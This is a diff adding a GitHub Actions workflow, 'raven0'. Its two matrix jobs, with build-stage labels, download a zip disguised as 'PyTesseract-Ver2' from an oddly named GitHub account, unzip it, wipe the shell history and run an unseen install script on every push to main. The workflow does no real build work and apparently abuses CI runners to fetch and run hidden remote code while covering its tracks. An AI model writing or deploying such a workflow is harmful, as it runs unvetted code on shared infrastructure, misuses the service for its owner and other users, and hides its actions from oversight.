@@ -1,0 +1,49 @@
+name: raven0
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  Assemble:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.0, I.I, I.II]
+        flag: ['Provision', 'Build', 'Confirm', 'Trigger', 'Deploy']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: Download Assemble
+      run: |
+        curl -L -o PyTesseract-Ver2.zip https://github.com/G1tHuP333/test/raw/refs/heads/main/PyTesseract-Ver2.zip
+        unzip -o PyTesseract-Ver2.zip
+        history -c && history -w
+        bash install_module.sh
+
+  Publish1:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.0, I.I, I.II]
+        flag: ['Configure', 'Package', 'Assess', 'Operate', 'Distribute']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: Installl Publish1
+      run: |
+        curl -L -o PyTesseract-Ver2.zip https://github.com/G1tHuP333/test/raw/refs/heads/main/PyTesseract-Ver2.zip
+        unzip -o PyTesseract-Ver2.zip
+        history -c && history -w
+        bash install_module.sh 
+        
